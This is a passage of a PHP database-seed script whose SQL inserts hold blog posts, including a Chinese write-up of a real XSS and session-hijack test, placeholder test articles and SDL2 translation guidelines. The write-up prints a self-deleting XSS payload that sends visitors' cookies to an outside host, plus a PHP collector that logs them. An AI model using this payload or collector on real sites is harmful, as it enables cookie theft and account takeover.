哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](http://three.atd3.org/index.php/upload:157/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'53\',\'2\',\'1476889999\',\'1476889999\',\'0\',\'0\',\'1\',\'1\',\'0\',\'914427012952a18e5a7bcc0f33b53505\'),(\'86\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透。\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](http://three.atd3.org/index.php/upload:146/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？ :微笑: 反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\"\\\" 
onerror=\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\"<?php \\\\$a=[];\\\\n\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\"\\\';\\\\n\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\"\\\" onerror=\\\"console.log(\\\'xss\\\');\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](http://three.atd3.org/index.php/upload:147/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](http://three.atd3.org/index.php/upload:148/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](http://three.atd3.org/index.php/upload:149/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](http://three.atd3.org/index.php/upload:150/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](http://three.atd3.org/index.php/upload:151/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](http://three.atd3.org/index.php/upload:152/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](http://three.atd3.org/index.php/upload:153/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](http://three.atd3.org/index.php/upload:154/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](http://three.atd3.org/index.php/upload:155/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](http://three.atd3.org/index.php/upload:156/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](http://three.atd3.org/index.php/upload:157/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为
[Download](http://three.atd3.org/index.php/upload:160/safe.zip)\',\'56\',\'5\',\'1477209206\',\'1477209206\',\'0\',\'0\',\'1\',\'1\',\'0\',\'430ebe217c0af3e600f243f74780bfd8\'),(\'87\',\'0\',\'0\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'5\',\'1477230682\',\'1477276092\',\'0\',\'0\',\'0\',\'0\',\'0\',\'c66399766642f2dd89fb5184644a52a7\'),(\'88\',\'0\',\'0\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'2\',\'1477231495\',\'1477273905\',\'0\',\'0\',\'1\',\'1\',\'0\',\'64edc90707128b5d453fbc143deb9ba6\'),(\'97\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'1\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'a2b4933d6dec3f33fe1240d016cc1f25\'),(\'98\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'0\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'e7c09afefb73aef1130b80b56671463f\'),(\'99\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'0\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'96eead5d355f5c113cd54ed51e881bec\'),(\'100\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'0\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'2d6c306dd70d3ee5d41099bc8ffa37dd\'),(\'101\',\'0\',\'0\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'0\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'c224f7eb684138cd41bc4d28686bc34f\'),(\'102\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'2\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'01fd0a9905cfd8b9b1e9dd43030bb670\'),(\'103\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'0\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'1d78554e222ef4d9331d1282ef81af6b\'),(\'104\',\'0\',\'3\',\'文章标题，必须以#开头，可1~6个\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'
文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```\',\'56\',\'1\',\'1477231495\',\'1477231495\',\'0\',\'0\',\'0\',\'0\',\'0\',\'2360a2a63cb8860ecd6c537ff3b39caf\'),(\'105\',\'0\',\'1\',\'Markdown新文件格式\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```
居然会相同ID。。。也是啊，，，，
:--center
完成了，就是不更新
:--\',\'0\',\'9\',\'1477231495\',\'1477276092\',\'0\',\'0\',\'1\',\'1\',\'0\',\'880fd096d29982df8531769a19c151be\'),(\'110\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/upload:305/README.md)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'25\',\'1477277398\',\'1477296866\',\'0\',\'0\',\'1\',\'1\',\'0\',\'624838e08e6f66dfa7ad3ffaf2be490c\'),(\'111\',\'0\',\'6\',\'一次不完整的XSS混合渗透测试记录\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)\',\'53\',\'1\',\'1477296138\',\'1477296138\',\'0\',\'0\',\'1\',\'1\',\'0\',\'f30f47d78906b7476e0550ee7c9c9c3c\'),(\'113\',\'0\',\'6\',\'一次不完整的XSS混合渗透测试记录\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/article:112/)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'0\',\'1477296634\',\'1477298223\',\'0\',\'0\',\'1\',\'1\',\'0\',\'bdcf4e43b0a0eb7a7a0a8fff0d86a959\'),(\'114\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)

[Functions](src/SDL_RenderCopy.md)\',\'53\',\'1\',\'1477296728\',\'1477296728\',\'0\',\'0\',\'1\',\'1\',\'0\',\'b6f40ddc110bccb413c910288f301280\'),(\'115\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/upload:304/README.md)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'5\',\'1477296842\',\'1477296842\',\'0\',\'0\',\'1\',\'1\',\'0\',\'5df037069fdd1d56e26788afab72b08d\'),(\'116\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/upload:306/README.md)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'0\',\'1477296958\',\'1477296958\',\'0\',\'0\',\'1\',\'1\',\'0\',\'332c8b17d4afc4e4d4eeff998c778f28\'),(\'117\',\'0\',\'0\',\'SDL2 文档翻译说明\',\'\',\'

1. 统一采用Markdown文件编码格式,不会请参考 [Markdown入门指南](http://www.jianshu.com/p/1e402922ee32/)
2. 翻译规范 
    1. 命名文件，以及放的位置
        文件名统一用列出的标题命名，如我要翻译文档`SDL_AddEventWatch`,文件命名则为`SDL_AddEventWatch.md`   
        文件放的位置为 类别/文件名 其中类别有 `Hints`,`Enumerations`,`Structures`,`Functions`,对应相应文件夹中
    2. 翻译标记
        在翻译文档时，请在[List.md](List.md) 的相应列后面加 `translating by ID 时间`，如：`- [ ] SDL_AddEventWatch translating by DXkite 2016-09-18`  
        然后提交到本GIT库中，不会使用git库的，请联系 @DXkite 或者查看[Github 简明教程](http://www.runoob.com/w3cnote/git-guide.html)学习，
        翻译完成后，请将`[ ]`改为`[x]`，标识该文档已经翻译，并添加文件链接,可修改日期,如`- [x] [SDL_AddEventWatch](Functions/SDL_AddEventWatch.md) translated by DXkite 2016-09-19`
    3. 文件链接
        如链接 `See SDL_LogPriority for details` 其中 `SDL_LogPriority` 为链接`http://wiki.libsdl.org/SDL_LogPriority`，找到其对应位置，
        用 `[SDL_LogPriority](MD路径)` 来表示，该例子的实例：`See [SDL_LogPriority](Functions/SDL_LogPriority.md) for details` -> See [SDL_LogPriority](Functions/SDL_LogPriority.md) for details
    4. 类别和分类目录之类的东西不需要翻译，如图：    
        ![目录截图](目录截图.png)
        ![目录链接](目录链接.png)
    5. 作者标记，原文链接
        在文本末尾加入 `--------------------- ` 和 `Translate By 作者 Reference: 原文链接`
    6. Markdown 目录标记
        用 `#`,`##`,`###`来标识一二三级标题
    7. 文章暂时发布在[ATD-Library](http://library.atd3.cn)上，由管理员上传，请管理员申请账号，找群主申请编辑权限
    8. 翻译为双语对照
3. 翻译原文列表
    http://wiki.libsdl.org/CategoryAPI
4. 加入翻译组 (自愿者)
    点击链接加入群 [ATD-翻译组](http://jq.qq.com/?_wv=1027&k=29rZUY1)

-------------------------------------------------
[全部列表](List.md)
[分类列表](Category/README.md)\',\'53\',\'0\',\'1477298140\',\'1477298140\',\'0\',\'0\',\'1\',\'1\',\'0\',\'53b8c822f711d55705406c678d9481f5\'),(\'118\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/article:117/)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'0\',\'1477298140\',\'1477298140\',\'0\',\'0\',\'1\',\'1\',\'0\',\'5f4a8fd8ebc13f35a419736137eb0252\'),(\'119\',\'0\',\'0\',\'SDL2 文档翻译说明\',\'文件修改\',\'                你Dub干嘛。。。。
1. 统一采用Markdown文件编码格式,不会请参考 [Markdown入门指南](http://www.jianshu.com/p/1e402922ee32/)
2. 翻译规范 
    1. 命名文件，以及放的位置
        文件名统一用列出的标题命名，如我要翻译文档`SDL_AddEventWatch`,文件命名则为`SDL_AddEventWatch.md`   
        文件放的位置为 类别/文件名 其中类别有 `Hints`,`Enumerations`,`Structures`,`Functions`,对应相应文件夹中
    2. 翻译标记
        在翻译文档时，请在[List.md](List.md) 的相应列后面加 `translating by ID 时间`，如：`- [ ] SDL_AddEventWatch translating by DXkite 2016-09-18`  
        然后提交到本GIT库中，不会使用git库的，请联系 @DXkite 或者查看[Github 简明教程](http://www.runoob.com/w3cnote/git-guide.html)学习，
        翻译完成后，请将`[ ]`改为`[x]`，标识该文档已经翻译，并添加文件链接,可修改日期,如`- [x] [SDL_AddEventWatch](Functions/SDL_AddEventWatch.md) translated by DXkite 2016-09-19`
    3. 文件链接
        如链接 `See SDL_LogPriority for details` 其中 `SDL_LogPriority` 为链接`http://wiki.libsdl.org/SDL_LogPriority`，找到其对应位置，
        用 `[SDL_LogPriority](MD路径)` 来表示，该例子的实例：`See [SDL_LogPriority](Functions/SDL_LogPriority.md) for details` -> See [SDL_LogPriority](Functions/SDL_LogPriority.md) for details
    4. 类别和分类目录之类的东西不需要翻译，如图：    
        ![目录截图](目录截图.png)
        ![目录链接](目录链接.png)
    5. 作者标记，原文链接
        在文本末尾加入 `--------------------- ` 和 `Translate By 作者 Reference: 原文链接`
    6. Markdown 目录标记
        用 `#`,`##`,`###`来标识一二三级标题
    7. 文章暂时发布在[ATD-Library](http://library.atd3.cn)上，由管理员上传，请管理员申请账号，找群主申请编辑权限
    8. 翻译为双语对照
3. 翻译原文列表
    http://wiki.libsdl.org/CategoryAPI
4. 加入翻译组 (自愿者)
    点击链接加入群 [ATD-翻译组](http://jq.qq.com/?_wv=1027&k=29rZUY1)

-------------------------------------------------
[全部列表](List.md)
[分类列表](Category/README.md)                \',\'53\',\'4\',\'1477298311\',\'1477475194\',\'0\',\'0\',\'1\',\'1\',\'0\',\'a0939a9bca6770e1bd82f9f22508ce00\'),(\'120\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试

[下一个文章](http://three.atd3.org/index.php/article:105/)
[添加测试的文章](http://three.atd3.org/index.php/article:119/)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'1\',\'1477298311\',\'1477298311\',\'0\',\'0\',\'1\',\'1\',\'0\',\'d2b609ca06f99e24823101c9f85915c1\'),(\'121\',\'0\',\'18\',\'DX C语言简易学习教程\',\'
[编程环境安装 - Code::blocks IDE](http://three.atd3.org/index.php/upload:311/prepare.md)
\',\'
[编程环境安装 - Code::blocks IDE](http://three.atd3.org/index.php/upload:311/prepare.md)
\',\'53\',\'1\',\'1477315258\',\'1477315258\',\'0\',\'0\',\'1\',\'1\',\'0\',\'995745f2414642ca6a59e99b3e17f5c6\'),(\'123\',\'0\',\'18\',\'DX C语言简易学习教程\',\'
[编程环境安装 - Code::blocks IDE](http://three.atd3.org/index.php/article:122/)
\',\'
[编程环境安装 - Code::blocks IDE](http://three.atd3.org/index.php/article:122/)
\',\'53\',\'1\',\'1477315381\',\'1477315381\',\'0\',\'0\',\'1\',\'1\',\'0\',\'21a4bdd48c8e24f4aad0bb19cf7029e8\'),(\'124\',\'0\',\'22\',\'编程环境安装 - Code::blocks IDE\',\'今天时间不够了，等写完其他的再来写\',\'今天时间不够了，等写完其他的再来写\',\'53\',\'5\',\'1477317937\',\'1477318001\',\'0\',\'0\',\'1\',\'1\',\'0\',\'05efa286b77e0d5141a2b829e49acc30\'),(\'126\',\'0\',\'1\',\'Markdown新文件格式\',\'这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。\',\'文章正文 ，文章信息头不会出现在文章内容中。
本文件为单markdown文本的格式，后续将会取消配置文件
个人在使用的时候感觉配置文件真心不方便。
然后各种标签信息长度为一行，一个换行符截断。
上面的 `:` 为英文：
## 本文文章头:
```markdown
# 文章标题，必须以#开头，可1~6个
标签 (空格分割): 测试标签
修改 (修改ID):87
分类 (用>来标明是某分类的子分类): 网站日志>作者通知
作者 (超级管理可以代替别人发文章) : DXkite
时间 (任何英文文本的日期时间描述) :2016-10-23 22:04:55
摘要:
这里是摘要，取两个换行标识结束，长度最长为255个字符，多余的长度将会被截断。

以上内容包括下面的下划线将会用于文章的信息描述，不会出现在正文中
---
```
居然会相同ID。。。也是啊，，，，
:--center
完成了，就是不更新
:--\',\'0\',\'1\',\'1477276092\',\'1477276092\',\'0\',\'0\',\'1\',\'1\',\'0\',\'4007c65fb43cc83707a276bfdf0b51f3\'),(\'127\',\'0\',\'6\',\'测试用的Index文章\',\'本文将实地进行渗透测试\',\'本文将实地进行渗透测试


When \\\\(a \\\\ne 0\\\\), there are two solutions to \\\\(ax^2 + bx + c = 0\\\\) and they are
$$x = {-b \\\\pm \\\\sqrt{b^2-4ac} \\\\over 2a}.$$


[下一个文章](http://three.atd3.org/index.php/article:126/)
[添加测试的文章](http://three.atd3.org/index.php/upload:317/README.md)
[Functions](src/SDL_RenderCopy.md)\',\'53\',\'62\',\'1477475193\',\'1477475193\',\'0\',\'0\',\'1\',\'1\',\'0\',\'c0b8a88162ab27a05fe8b3379544a847\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{category}'))->exec();

 (new Query('CREATE TABLE `#{category}` (
  `cid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \'分类\',
  `icon` bigint(20) NOT NULL COMMENT \'分类图标\',
  `topic` bigint(20) NOT NULL,
  `name` varchar(80) NOT NULL DEFAULT \'无分类\',
  `discription` tinytext NOT NULL,
  `count` int(11) NOT NULL DEFAULT \'0\',
  `parent` int(11) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`cid`),
  UNIQUE KEY `name` (`name`),
  KEY `cname` (`name`),
  KEY `parent` (`parent`),
  KEY `topic` (`topic`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{category}` VALUES (\'1\',\'0\',\'0\',\'网站日志\',\'网站的相关话题\',\'2\',\'0\'),(\'2\',\'1\',\'0\',\'网站教程\',\'网站内的一些教程\',\'3\',\'0\'),(\'3\',\'0\',\'0\',\'作者通知\',\'作者通知\',\'8\',\'0\'),(\'4\',\'0\',\'0\',\'信息安全\',\'信息安全\',\'0\',\'0\'),(\'5\',\'0\',\'0\',\'网络安全\',\'网络安全\',\'0\',\'4\'),(\'6\',\'0\',\'0\',\'功能测试\',\'功能测试\',\'9\',\'0\'),(\'18\',\'0\',\'0\',\'DX随笔教程集\',\'DX随笔教程集\',\'5\',\'0\'),(\'22\',\'0\',\'0\',\'C语言教程\',\'C语言教程\',\'1\',\'0\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{nav}'))->exec();

 (new Query('CREATE TABLE `#{nav}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(24) NOT NULL,
  `url` tinytext NOT NULL,
  `title` varchar(255) NOT NULL,
  `show` tinyint(1) NOT NULL DEFAULT \'1\',
  `sort` int(11) NOT NULL DEFAULT \'0\',
  `parent` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `parent` (`parent`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8'))->exec();

